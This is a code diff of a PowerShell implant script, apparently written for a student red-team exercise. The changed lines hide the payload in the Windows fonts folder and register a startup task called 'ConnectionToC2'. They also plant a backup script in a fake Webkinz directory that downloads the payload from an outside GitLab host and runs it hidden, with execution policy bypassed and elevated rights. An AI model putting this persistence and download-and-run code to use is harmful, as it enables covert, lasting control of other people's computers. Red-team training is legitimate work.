@@ -25,7 +25,7 @@ function Convert-ROT13 {
 }
 
 # Create scheduled task for this payload to run on boot
-$action = New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\fonts\Javalanche.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"
 
@@ -37,9 +37,9 @@ if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
 }
 if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
     New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
-    $backupCommands = "if(!(Test-Path C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1)){"
-    $backupCommands += "wget -o C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`""
-    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1 -BeaconIPAddress $($beaconIPAddress)`" -Verb RunAs}"
+    $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
+    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/Javalanche.ps1`""
+    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -Verb RunAs}"
     $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
 }
 
